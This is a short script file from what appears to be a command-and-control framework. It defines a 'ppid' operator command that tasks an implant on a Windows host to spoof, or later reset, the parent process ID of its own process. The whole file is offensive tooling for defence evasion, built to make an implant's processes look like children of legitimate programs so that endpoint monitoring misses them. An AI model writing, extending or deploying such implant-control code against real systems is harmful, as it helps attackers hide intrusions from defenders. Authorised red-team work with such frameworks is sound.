alias(
  "ppid",
  fn (aid, cmd, args, raw) {
    if !is_windows(aid) {
      c_error("unsupported OS to perform PPID spoofing");
      return m_error(aid, "unsupported OS to perform PPID spoofing");
    }
    if args.len() == 0 {
      c_notify("tasked agent to revert PPID of process");
      m_notify(aid, "tasked agent to revert PPID of process");
      return a_ppid(aid);
    } elif args.len() == 1 {
      p = int(args[0]);
      if p < 0 {
        c_error("invalid PPID value");
        return m_error(aid, "invalid PPID value");
      }
      c_notify("tasked agent to spoof PPID");
      m_notify(aid, "tasked agent to spoof PPID");
      return a_ppid(aid, p);
    } else {
      c_error("invalid number of arguments");
      return m_error(aid, "invalid number of arguments");
    }
  },
  "Spoof parent PID of agent's process",
  "Usage:\n  ppid [pid] - spoof PPID\n\tppid - reset PPID",
  true
);